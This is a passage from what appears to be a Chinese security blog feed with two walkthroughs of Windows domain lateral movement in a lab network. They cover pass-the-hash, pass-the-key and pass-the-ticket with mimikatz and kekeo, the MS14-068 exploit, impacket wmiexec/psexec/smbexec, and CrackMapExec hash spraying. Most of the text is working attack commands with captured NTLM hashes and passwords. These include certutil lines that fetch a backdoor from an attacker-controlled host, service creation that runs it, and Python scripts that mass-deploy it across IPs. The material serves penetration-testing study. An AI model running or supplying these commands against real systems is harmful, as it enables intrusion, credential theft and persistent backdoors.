class="code"><pre><span class="line">mimikatz privilege::debug</span><br><span class="line">mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c</span><br></pre></td></tr></table></figure><p>执行完成后在主机弹出一个cmd窗口<br><img src="/posts/b0cb9aff/1664590669515-9b811fa9-c480-4a09-9ecb-7e9168ae96f1.png" alt="image-20221001101248997.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.32\c$</span><br><span class="line">dir \\192.168.3.32\c$</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664590678773-60b7d7c0-d02f-4579-b68e-6b330e90e49d.png" alt="image-20221001101418441.png"><br>利用转发上线,把后门上传到webserver然后利用以下命令上传到目标然后执行上线</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Users\webadmin\Desktop\zf.exe \\192.168.3.32\c$</span><br><span class="line">sc \\sqlserver create bshell binpath= &quot;c:\zf.exe&quot; #sqlserver是192.168.3.32的主机名字可换为ip地址</span><br><span class="line">sc \\sqlserver start bshell </span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664591628278-cd66e3fa-cf04-4ea0-a4c2-805ae255afed.png" alt="image.png"><br>成功上线</p><h3 id="2、impacket-at-amp-ps-amp-wmi-amp-smb"><a href="#2、impacket-at-amp-ps-amp-wmi-amp-smb" class="headerlink" title="2、impacket-at&amp;ps&amp;wmi&amp;smb"></a>2、impacket-at&amp;ps&amp;wmi&amp;smb</h3><p>CS利用webserver开启socks代理然后用Proxifier连接代理<br><img src="/posts/b0cb9aff/1664591828118-6532749c-ebc9-4121-a874-fc1caf1a670a.png" alt="image.png"><br>以下工具均在impacket套件中，根据协议开放三选一即可<br>exe版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">psexec</span></span><br><span class="line">psexec -hashes :NTLM值 域名/域用户@域内ip地址</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">smbexec</span></span><br><span class="line">smbexec -hashes :NTLM值 域名/域用户@域内ip地址</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">wmiexec</span></span><br><span class="line">wmiexec -hashes :NTLM值 域名/域用户@域内ip地址</span><br></pre></td></tr></table></figure><p>python版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">psexec</span></span><br><span class="line">python psexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">smbexec</span></span><br><span class="line">python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">wmiexec</span></span><br><span class="line">python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br></pre></td></tr></table></figure><p>执行结束后会返回一个cmd会话<br><img src="/posts/b0cb9aff/1664592072918-4bf51e93-a00b-401e-a79b-498f29d12573.png" alt="image.png"><br><img src="/posts/b0cb9aff/1664592131849-b560c575-38e6-4470-9385-b33cbdc6455c.png" alt="image.png"><br>后续上线方法:将后门上传到webserver的web目录，然后利用cmd会话下载后门然后执行(具体操作见前篇)<br>三个工具都是返回cmd会话，操作相同</p><h2 id="PTK-Mimikatz-amp-AES256"><a href="#PTK-Mimikatz-amp-AES256" class="headerlink" title="PTK-Mimikatz&amp;AES256"></a>PTK-Mimikatz&amp;AES256</h2><p>PTK &#x3D; Pass The Key，当系统安装了KB2871997补丁且禁用了NTLM的时候，<br>那我们抓取到的ntlm hash也就失去了作用，但是可以通过PTK的攻击方式获得权限。<br>利用方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::ekeys</span><br><span class="line">mimikatz sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值</span><br></pre></td></tr></table></figure><p>由于环境不允许无法复现</p><h2 id="PTT-漏洞-amp-Kekeo-amp-Ticket"><a href="#PTT-漏洞-amp-Kekeo-amp-Ticket" class="headerlink" title="PTT-漏洞&amp;Kekeo&amp;Ticket"></a>PTT-漏洞&amp;Kekeo&amp;Ticket</h2><p><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a><br><a href="https://github.com/gentilkiwi/kekeo/releases">https://github.com/gentilkiwi/kekeo/releases</a></p><h3 id="1、MS14068-webadmin权限"><a href="#1、MS14068-webadmin权限" class="headerlink" title="1、MS14068(webadmin权限)"></a>1、MS14068(webadmin权限)</h3><blockquote><p><strong>利用漏洞生成的用户的新身份票据尝试认证</strong></p></blockquote><p>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。<br>它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC。<br>该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。<br>用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证.<br>简单来说就是伪造用户身份,类似cookie伪造，只要是域内用户就可以<br>获取SID值：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell whoami/user</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664593480957-4f7a00af-b16e-4384-bb62-6bf1e308abe6.png" alt="image.png"><br>生成票据文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ms14-068.exe -u webadmin@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1132 -d 192.168.3.21 -p admin!@#45</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664593623202-c6794fdb-7a58-4a85-b477-80922a2847cb.png" alt="image.png"><br><img src="/posts/b0cb9aff/1664593642112-4a75aa17-5cea-43c3-b72e-83485cc2c4e6.png" alt="image.png"><br>清除票据连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist purge</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664593684804-6dbc7024-f97c-40bb-a1d0-2d3be9a9948d.png" alt="image.png"><br>把生成的票据文件上传到webserver<br><img src="/posts/b0cb9aff/1664593747716-ad567511-895c-48de-9281-f1732dcfd13c.png" alt="image.png"><br>内存导入票据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptc TGT_webadmin@god.org.ccache</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664593800849-b3f3ead2-e294-4695-baa8-afac6eb5579e.png" alt="image.png"><br><img src="/posts/b0cb9aff/1664593818520-b1f29128-73e2-42f0-b6f6-65bcf9ae9296.png" alt="image.png"><br>注意这里的开始和结束时间，只有在这个时间端内票据才是有效的<br>测试连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意这里要使用计算机名 使用ip地址可能出错</span></span><br><span class="line">shell dir \\OWA2010CN-GOD\c$</span><br><span class="line">shell net use \\OWA2010CN-GOD\C$</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664594028087-6c0079b6-a49e-4518-9d2b-5f896c5656bb.png" alt="image.png"><br>上线</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell copy C:\Users\webadmin\Desktop\zf.exe \\OWA2010CN-GOD\C$</span><br><span class="line">shell sc \\OWA2010CN-GOD create bindshell binpath= &quot;c:\zf.exe&quot;</span><br><span class="line">shell sc \\OWA2010CN-GOD start bindshell</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664594110665-248b64a7-cf44-4236-b764-612599dc5270.png" alt="image.png"><br><img src="/posts/b0cb9aff/1664594118134-e7d259b7-db2f-4d23-a66b-8c34125b2e46.png" alt="image.png"><br>注意：成功不成功看DC域控漏洞补丁打没打</p><h3 id="2、kekeo-高权限，需NTLM"><a href="#2、kekeo-高权限，需NTLM" class="headerlink" title="2、kekeo(高权限，需NTLM)"></a>2、kekeo(高权限，需NTLM)</h3><blockquote><p><strong>利用获取的NTLM生成新的票据尝试认证</strong></p></blockquote><p>利用我们获取到NTLM重新生成一个票据然后再去连接<br>缺点：票据是有有效期的，所以如果当前主机在连接过域控的话，有效期内可利用。<br>先把kekeo.exe上传到webserver<br>生成票据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意这里是利用域控的<span class="built_in">hash</span> 如果用普通成员的<span class="built_in">hash</span>无法成功 可以通过横向移动到其他主机拿到</span></span><br><span class="line">shell kekeo &quot;tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p>导入票据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell kekeo &quot;kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p>查看票据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure><p>利用票据连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664600117220-4bb77a02-9509-4348-ab28-faabcb1298ea.png" alt="image.png"><br>注意：成功不成功看ntlm哈希值的正确性<br><strong>到这里可能会有疑问有了hash值为什么不用pth攻击呢?</strong><br>注意pth的利用前提是smb和wmi等协议是正常的,那么这些不正常的时候我们就可以利用ptt攻击来达到目的<br>一个是NTLM认证,一个是Kerberos认证</p><h3 id="3、mimikatz-高权限-需Ticket"><a href="#3、mimikatz-高权限-需Ticket" class="headerlink" title="3、mimikatz(高权限,需Ticket)"></a>3、mimikatz(高权限,需Ticket)</h3><blockquote><p><strong>利用历史遗留的票据重新认证尝试</strong></p></blockquote><p>域控与主机建立连接后生成的票据有效时间为10个小时，在这10个小时中拿到票据那么就可以利用mimikatz将票据导出然后再导入进行伪造。<br>导出票据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p>导入票据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里要选择管理员登录电脑后生成的票据</span></span><br><span class="line">mimikatz kerberos::ptt C:\Users\webadmin\Desktop\[0;687080]-2-0-40e00000-Administrator@krbtgt-god.org.kirbi</span><br></pre></td></tr></table></figure><p>查看票据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure><p>利用票据连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure><p>注意：成功不成功看当前主机有没有被目标连接过<br><img src="/posts/b0cb9aff/1664608850615-84121039-14c8-4e88-af9c-eca4ef59414d.png" alt="image.png"></p><h2 id="PTH-Proxychains-amp-CrackMapExec"><a href="#PTH-Proxychains-amp-CrackMapExec" class="headerlink" title="PTH-Proxychains&amp;CrackMapExec"></a>PTH-Proxychains&amp;CrackMapExec</h2><p>CrackMapExec<br>Github：<a href="https://github.com/Porchetta-Industries/CrackMapExec">https://github.com/Porchetta-Industries/CrackMapExec</a><br>官方手册：<a href="https://mpgn.gitbook.io/crackmapexec/">https://mpgn.gitbook.io/crackmapexec/</a><br>部分案例：<a href="https://www.freebuf.com/sectool/184573.html">https://www.freebuf.com/sectool/184573.html</a><br>下载对应release，建立socks连接，设置socks代理，配置规则，调用！<br>详细配置可看上篇<br>1、Linux Proxychains使用<br>代理配置：Proxychains.conf<br>代理调用：Proxychains 命令<br>2、密码喷射-域用户登录PTH：<br>利用CrackMapExec对hash值进行验证</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">域用户HASH登录</span></span><br><span class="line">proxychains python cme smb 192.168.3.21-32 -u user.txt -H 518b98ad4178a53695dc997aa02d455c </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">本地用户HASH登录</span></span><br><span class="line">proxychains python cme smb 192.168.3.21-32 -u administrator -H 518b98ad4178a53695dc997aa02d455c --local-auth</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664610207506-ad93ffcb-4e92-40d9-9dc8-a72b638a9dac.png" alt="image.png"><br><img src="/posts/b0cb9aff/1664609993691-b465b616-0829-4bac-933a-0cc1a5a57884.png" alt="image.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。<br>如果禁用了ntlm认证，PsExec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1&#x2F;2012r2，安装补丁kb2871997的Win 7&#x2F;2008r2&#x2F;8&#x2F;2012等，可以使用AES keys代替NT hash来实现ptk攻击,<br>打了KB2871997补丁后的影响</p><ul><li>pth：没打补丁用户都可以连接，打了补丁只能administrator连接</li><li>ptk：打了补丁才能用户都可以连接，采用aes256连接</li><li><a href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a></li></ul><p>PTT攻击的部分就不是简单的NTLM认证了，它是利用Kerberos协议进行攻击的，三种常见的攻击方法：MS14-068，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。<br>MS14-068基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)<br>其中Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术<br>MS14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向移动(二)-WMI&amp;SMB</title>
      <link href="/posts/82f7f61b/"/>
      <url>/posts/82f7f61b/</url>
      
        <content type="html"><![CDATA[<h1 id="内网横向移动-二-WMI-amp-SMBWMI-amp-SMB"><a href="#内网横向移动-二-WMI-amp-SMBWMI-amp-SMB" class="headerlink" title="内网横向移动(二)-WMI&amp;SMBWMI&amp;SMB"></a>内网横向移动(二)-WMI&amp;SMBWMI&amp;SMB</h1><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p><img src="/posts/82f7f61b/bfl2kYExirJ2o8jENtd6_g.png" alt="img"><br><img src="/posts/82f7f61b/image-20220929085713847.png" alt="image-20220929085713847"><br>和上篇环境相同已经拿到webserver权限并且提权</p><h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p>方法和上篇相同<br><img src="/posts/82f7f61b/image-20220929090156725.png" alt="image-20220929090156725"><br><img src="/posts/82f7f61b/image-20220929090206296.png" alt="image-20220929090206296"></p><h2 id="域横向移动"><a href="#域横向移动" class="headerlink" title="域横向移动"></a>域横向移动</h2><p>先将木马上传到webserver的web目录(具体操作见上篇)<br><img src="/posts/82f7f61b/image-20220929092116112.png" alt="image-20220929092116112"></p><h3 id="WMI-自带-amp-命令-amp-套件-amp-插件"><a href="#WMI-自带-amp-命令-amp-套件-amp-插件" class="headerlink" title="WMI-自带&amp;命令&amp;套件&amp;插件"></a>WMI-自带&amp;命令&amp;套件&amp;插件</h3><p>WMI是通过135端口进行利用，支持用户名明文的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p><h4 id="1-wmic"><a href="#1-wmic" class="headerlink" title="1.wmic"></a>1.wmic</h4><p>内部：(单执行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.3.32 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/test.exe&quot;</span><br><span class="line">wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create &quot;cmd.exe c:/beacon.exe&quot;</span><br></pre></td></tr></table></figure><p>执行结束后并没有回显<br><img src="/posts/82f7f61b/image-20220929092535171.png" alt="image-20220929092535171"><br>但是确实已经执行成功<br><img src="/posts/82f7f61b/image-20220929092558693.png" alt="image-20220929092558693"></p><h4 id="2-cscript"><a href="#2-cscript" class="headerlink" title="2.cscript"></a>2.cscript</h4><p>内置：(交互式)</p><p>上传wmiexec.vbs(用webserver的web环境)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345</span><br></pre></td></tr></table></figure><p>可以反弹shell但是在cs中不能操作 需要在本机shell环境执行<br><img src="/posts/82f7f61b/image-20220929093356049.png" alt="image-20220929093356049"></p><h4 id="3-wmiexec-impacket"><a href="#3-wmiexec-impacket" class="headerlink" title="3.wmiexec-impacket"></a>3.wmiexec-impacket</h4><p>wmiexec为impacket套件中的工具<br>cs建立SOCKS代理 本机通过proxifier和内网环境进行通讯<br>执行命令:</p><p>外部：(交互式&amp;单执行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#明文</span><br><span class="line">python wmiexec.py ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;</span><br><span class="line">#hash</span><br><span class="line">python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929094339457.png" alt="image-20220929094339457"><br><img src="/posts/82f7f61b/image-20220929095344270.png" alt="image-20220929095344270"></p><p>下载后门：实际情况中要对账号(本地和域)和密码进行尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py ./administrator:admin!@#45@192.168.3.32 &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/mm.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929094721757.png" alt="image-20220929094721757"></p><p>执行后门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py ./administrator:admin!@#45@192.168.3.32 &quot;cmd.exe /c c:/mm.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929094834259.png" alt="image-20220929094834259"><br>继续抓取hash和明文密码,进行横向移动</p><h3 id="SMB-自带-amp-命令-amp-套件-amp-插件"><a href="#SMB-自带-amp-命令-amp-套件-amp-插件" class="headerlink" title="SMB-自带&amp;命令&amp;套件&amp;插件"></a>SMB-自带&amp;命令&amp;套件&amp;插件</h3><p>利用SMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放。</p><h4 id="1-psexec"><a href="#1-psexec" class="headerlink" title="1.psexec"></a>1.psexec</h4><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p>内部：(交互式 windows官方工具) 依旧是返回一个shell需要在本机shell环境执行还需要管理员权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec64 \\192.168.3.32 -u administrator -p admin!@#45 -s cmd</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929100826849.png" alt="image-20220929100826849"></p><p>外部：(交互式 外人开发的工具)<br>impacket套件windows版中工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929101711951.png" alt="image-20220929101711951"></p><p>插件：<br>cs插件-psexec<br><img src="/posts/82f7f61b/image-20220929101836985.png" alt="image-20220929101836985"><br><img src="/posts/82f7f61b/image-20220929102108420.png" alt="image-20220929102108420"><br><img src="/posts/82f7f61b/image-20220929102122142.png" alt="image-20220929102122142"><br>sqlserver再次上线</p><h4 id="2-smbexec-impacket"><a href="#2-smbexec-impacket" class="headerlink" title="2.smbexec-impacket"></a>2.smbexec-impacket</h4><p>外部：(交互式) .&#x2F;username为本地用户 god.&#x2F;username 为域用户 在实战中都要尝试(有可能域和本地密码相同，或内网本地密码统一)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbexec ./administrator:admin!@#45@192.168.3.32</span><br><span class="line">smbexec god/administrator:admin!@#45@192.168.3.32</span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c god/administrator@192.168.3.32</span><br><span class="line">smbexec -hashes god/administrator:518b98ad4178a53695dc997aa02d455c@192.168.3.32</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929102928994.png" alt="image-20220929102928994"></p><h4 id="3-services"><a href="#3-services" class="headerlink" title="3.services"></a>3.services</h4><p>内置：(单执行) –无回显</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 create -name shell -display shellexec -path C:\Windows\System32\shell.exe</span><br><span class="line">services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 start -name shell</span><br></pre></td></tr></table></figure><h3 id="工具-Proxychains-amp-CrackMapExec"><a href="#工具-Proxychains-amp-CrackMapExec" class="headerlink" title="工具-Proxychains&amp;CrackMapExec"></a>工具-Proxychains&amp;CrackMapExec</h3><h4 id="1、Windows-Proxifier-Python-exp"><a href="#1、Windows-Proxifier-Python-exp" class="headerlink" title="1、Windows+Proxifier+Python_exp"></a>1、Windows+Proxifier+Python_exp</h4><p>和上篇脚本类似</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">ips=[<span class="string">&#x27;192.168.3.21&#x27;</span>,<span class="string">&#x27;192.168.3.25&#x27;</span>,<span class="string">&#x27;192.168.3.29&#x27;</span>,<span class="string">&#x27;192.168.3.28&#x27;</span>,<span class="string">&#x27;192.168.3.30&#x27;</span>,<span class="string">&#x27;192.168.3.32&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        wmi_exec=<span class="string">&#x27;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\wmiexec.py ./administrator:admin!@#45@%s &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe&quot;&#x27;</span>%ip</span><br><span class="line">        <span class="built_in">print</span>(wmi_exec)</span><br><span class="line">        os.system(wmi_exec)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        wmi_exec=<span class="string">&#x27;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\wmiexec.py ./administrator:admin!@#45@%s &quot;c:/4455.exe&quot;&#x27;</span>%ip</span><br><span class="line">        <span class="built_in">print</span>(wmi_exec)</span><br><span class="line">        os.system(wmi_exec)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    down()</span><br><span class="line">    zx()</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929105529414.png" alt="image-20220929105529414"><br><img src="/posts/82f7f61b/image-20220929105548450.png" alt="image-20220929105548450"><br>3.29和3.32下载成功<br><img src="/posts/82f7f61b/image-20220929110153239.png" alt="image-20220929110153239"><br>上线 抓取hash和明文密码<br><img src="/posts/82f7f61b/image-20220929110315051.png" alt="image-20220929110315051"><br>修改脚本改为hash传递</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">ips=[<span class="string">&#x27;192.168.3.21&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        wmi_exec=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@%s &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/testm.exe&quot;&#x27;</span>%ip</span><br><span class="line">        <span class="built_in">print</span>(wmi_exec)</span><br><span class="line">        os.system(wmi_exec)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        wmi_exec=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@%s &quot;c:/testm.exe&quot;&#x27;</span>%ip</span><br><span class="line">        <span class="built_in">print</span>(wmi_exec)</span><br><span class="line">        os.system(wmi_exec)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    down()</span><br><span class="line">    zx()</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929110701383.png" alt="image-20220929110701383"><br>域控也成功上线–抓取域控密码直接通杀</p><h4 id="2、Linux-Proxychains-CrackMapExec"><a href="#2、Linux-Proxychains-CrackMapExec" class="headerlink" title="2、Linux+Proxychains+CrackMapExec"></a>2、Linux+Proxychains+CrackMapExec</h4><p>恢复到初始状态<br><img src="/posts/82f7f61b/image-20220929110947945.png" alt="image-20220929110947945"></p><p>上述的脚本要不断去修改才能达到理想效果，利用下面的项目更加方便快捷<br><strong>CrackMapExec</strong><br>Github：<a href="https://github.com/Porchetta-Industries/CrackMapExec">https://github.com/Porchetta-Industries/CrackMapExec</a><br>官方手册：<a href="https://mpgn.gitbook.io/crackmapexec/">https://mpgn.gitbook.io/crackmapexec/</a><br>部分案例：<a href="https://www.freebuf.com/sectool/184573.html">https://www.freebuf.com/sectool/184573.html</a><br>按照官方手册提示进行安装</p><p><strong>Linux Proxychains使用</strong><br>安装使用：<a href="https://blog.csdn.net/qq_53086690/article/details/121779832">https://blog.csdn.net/qq_53086690/article/details/121779832</a><br>代理配置：Proxychains.conf<br>代理调用：Proxychains 命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install Proxychains4 #安装</span><br><span class="line">vim /etc/proxychains4.conf #编辑配置文件</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929191046187.png" 